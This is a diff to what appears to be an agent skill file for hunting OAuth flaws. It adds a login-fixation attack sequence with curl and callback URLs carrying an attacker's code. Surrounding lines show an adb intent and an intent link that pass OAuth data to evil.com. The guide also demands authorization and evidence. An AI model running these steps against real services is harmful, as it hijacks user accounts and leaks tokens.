@@ -4,9 +4,37 @@ description: "Hunting skill for oauth vulnerabilities. Built from 19 public bug 
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [oauth, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [oauth, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting oauth on any target.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `playwright`, `python3`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Step 1: Initiate OAuth flow, capture state value
+# Step 2: Drop request, use attacker account's link with victim's session
+curl --max-time 30 --connect-timeout 10 -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"
+
+# Step 3: Force victim to visit callback with attacker's code + fixed state
+https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -181,7 +209,7 @@ adb shell am start -a android.intent.action.VIEW \
   -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"
 
 # Craft intent URI for web-based exploit
-<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
+# <a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
 ```
 
 ### Token Endpoint Auth Bypass
@@ -373,31 +401,7 @@ A server-side prefix-match flaw on `redirect_uri` is **necessary but not suffici
 
 **Operational rule:** the WHATWG URL parser (used by all modern browsers since 2018) does userinfo parsing ONLY in the authority section — i.e., **before the first `/` after `://`**. Once the path begins, `@` is just a character. Server-side string-startswith checks don't model this — they pass URLs the browser will then route to the legitimate host.
 
-**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. Verified live in `docs/verification/phase3-playwright-browser-execution.md` Test 29.
-
----
-
-## Verification
-
-Run this self-test to confirm oauth hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-oauth" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
+**Always headless-test (Playwright / Puppeteer / a real browser) the final navigation BEFORE writing the OAuth finding as ATO-chain.** Server-side accept + browser-side stay-on-legitimate-host = **not** ATO. (Verified live during skill development; the verification log is internal and not shipped with the repository.)
 
 ---
 
@@ -407,6 +411,14 @@ All 3 tests verify the skill is properly structured and ready for use.
 - **PKCE missing on public clients** — SPA/native apps without PKCE are vulnerable to authorization code interception.
 - **implicit flow still in use** — implicit flow (response_type=token) leaks tokens in URL fragments/referers. Report as deprecated, not necessarily exploitable.
 - **Client secret in frontend code** — OAuth client secrets in JS bundles are effectively public. The attack is what the secret enables, not its presence.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
